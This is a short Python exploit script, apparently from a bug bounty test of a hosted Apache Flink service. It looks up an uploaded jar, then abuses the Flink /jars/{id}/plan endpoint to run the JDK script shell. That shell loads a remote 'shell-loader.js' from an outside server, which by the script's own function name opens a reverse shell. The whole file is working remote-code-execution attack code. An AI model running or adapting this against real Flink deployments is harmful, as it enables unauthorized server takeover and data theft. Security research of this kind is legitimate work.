import requests
from requests.models import HTTPBasicAuth

flink_url = 'https://flink-1aabda13-wearehackerone-4f4e.aivencloud.com'
# flink_url = "http://localhost:8081"
shell_loader_url = 'https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js'
username = 'avnadmin'
password = ''

def load_reverse_shell(jar_id):
    url = f"{flink_url}/jars/{jar_id}/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(\"{shell_loader_url}\")&parallelism=1"

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }

    response = requests.request("GET", url, headers=headers, auth=HTTPBasicAuth(username=username, password=password))
    print(response.text)

def get_jar_id():
    url = f"{flink_url}/jars"

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }

    response = requests.request("GET", url, headers=headers, auth=HTTPBasicAuth(username=username, password=password))

    jar = response.json()['files'][0]

    return jar['id']

def main():
    jar_id = get_jar_id()
    print(f"jar_id: {jar_id}")
    load_reverse_shell(
        jar_id=jar_id
    )

if __name__ == '__main__':
    main()